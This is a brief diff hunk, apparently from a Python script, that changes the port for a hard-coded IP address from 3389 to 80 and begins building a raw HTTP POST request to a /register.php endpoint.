@@ -8,7 +8,7 @@ is_start=0
 zzz=[]
 
 host = "14.225.198.7"
-port = 3389
+port = 80
 
 headers = """\
 POST /register.php HTTP/1.1\r
